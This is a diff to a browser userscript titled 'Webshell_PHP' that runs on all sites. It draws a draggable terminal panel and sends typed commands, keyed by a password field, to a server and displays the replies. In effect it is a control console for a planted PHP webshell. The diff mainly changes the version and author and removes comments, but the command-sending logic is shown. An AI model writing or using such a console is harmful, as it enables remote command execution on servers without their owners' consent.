@@ -1,9 +1,9 @@
 // ==UserScript==
 // @name         Webshell_PHP
 // @namespace    http://tampermonkey.net/
-// @version      7.5
+// @version      7.6
 // @description  No
-// @author       TNET-feng
+// @author       FengPwner
 // @match        *://*/*
 // @grant        none
 // @run-at       document-end
@@ -75,12 +75,12 @@
         #wt-container.minimized #wt-header { pointer-events: auto; cursor: pointer; }
     `;
 
-    // 注入样式
+    
     const styleSheet = document.createElement("style");
     styleSheet.innerText = STYLES;
     document.head.appendChild(styleSheet);
 
-    // 创建 UI
+    
     const container = document.createElement('div');
     container.id = 'wt-container';
     container.innerHTML = `
@@ -107,17 +107,17 @@
     `;
     document.body.appendChild(container);
 
-    // 逻辑变量
+    
     const body = document.getElementById('wt-body');
     const input = document.getElementById('wt-input');
     const header = document.getElementById('wt-header');
     const minBtn = document.getElementById('wt-min-btn');
     let isMinimized = false;
 
-    // 默认最小化
+    
     toggleMinimize();
 
-    // 辅助函数：打印日志
+    
     function log(msg, type = 'sys') {
         const div = document.createElement('div');
         div.className = `log-line log-${type}`;
@@ -126,7 +126,7 @@
         body.scrollTop = body.scrollHeight;
     }
 
-    // 最小化功能
+    
     function toggleMinimize() {
         isMinimized = !isMinimized;
         if (isMinimized) container.classList.add('minimized');
@@ -135,35 +135,35 @@
     minBtn.addEventListener('click', (e) => { e.stopPropagation(); toggleMinimize(); });
     header.addEventListener('click', toggleMinimize);
 
-    // 拖拽功能
+    
     let isDragging = false;
     let startX, startY, initialLeft, initialTop;
 
-        // 统一处理开始拖拽 (鼠标和触摸)
+        
         const startDrag = (e) => {
-            // 排除特定元素
+            
             if (e.target.classList.contains('wt-dot')) return;
 
             isDragging = true;
 
-            // 获取当前手指/鼠标坐标
+            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
             const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
 
-            // 记录初始偏移量
+            
             startX = clientX - container.offsetLeft;
             startY = clientY - container.offsetTop;
 
-        // 防止移动端拖动时触发页面滚动
+        
           if (e.type.includes('touch')) {
        }
     };
 
-        // 统一处理移动过程
+        
         const onDrag = (e) => {
         if (!isDragging) return;
 
-        // 阻止默认滚动行为
+        
         e.preventDefault();
 
         const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
@@ -172,38 +172,38 @@
         container.style.left = (clientX - startX) + 'px';
         container.style.top = (clientY - startY) + 'px';
 
-        // 清除 bottom/right 以允许自由定位
+        
         container.style.bottom = 'auto';
         container.style.right = 'auto';
    };
 
-        // 统一处理结束拖拽
+        
         const stopDrag = () => {
         isDragging = false;
 
 };
 
-        // --- 绑定事件 ---
+        
 
-             // 监听 mousedown 和 touchstart
+             
              header.addEventListener('mousedown', startDrag);
              header.addEventListener('touchstart', startDrag, { passive: false });
 
 
-             // 移动：监听 mousemove 和 touchmove (绑定 document )
+             
              document.addEventListener('mousemove', onDrag);
              document.addEventListener('touchmove', onDrag, { passive: false });
 
-             // 结束：监听 mouseup 和 touchend
+             
              document.addEventListener('mouseup', stopDrag);
              document.addEventListener('touchend', stopDrag);
 
-    // 核心发送逻辑
+    
     async function sendCommand(cmd) {
         log(`> ${cmd}`, 'cmd');
 
 
-        // 内部指令处理
+        
         if (cmd.startsWith('/')) {
             const parts = cmd.split(' ');
             const action = parts[0].toLowerCase();
@@ -221,7 +221,7 @@
             return;
         }
 
-        // 构造 Payload
+        
         const payload = new FormData();
         payload.append(CURRENT_PASS, cmd);
 
@@ -235,16 +235,14 @@
 
             const text = await response.text();
 
-            // 清理 HTML 标签逻辑
-            // 如果返回整个页面的 HTML，提取正文
-            // 如果包含 <html>，则尝试提取 body 或特定区域
+            
             let cleanText = text;
             if (text.includes('<html') || text.includes('<!DOCTYPE')) {
 
                  const parser = new DOMParser();
                  const doc = parser.parseFromString(text, 'text/html');
 
-                 // 直接显示原文本，尝试去除常见标签
+                 
                  cleanText = doc.body ? doc.body.innerText : text;
             }
 
@@ -259,7 +257,7 @@
         }
     }
 
-    // 监听回车键
+    
     input.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
             const val = input.value.trim();
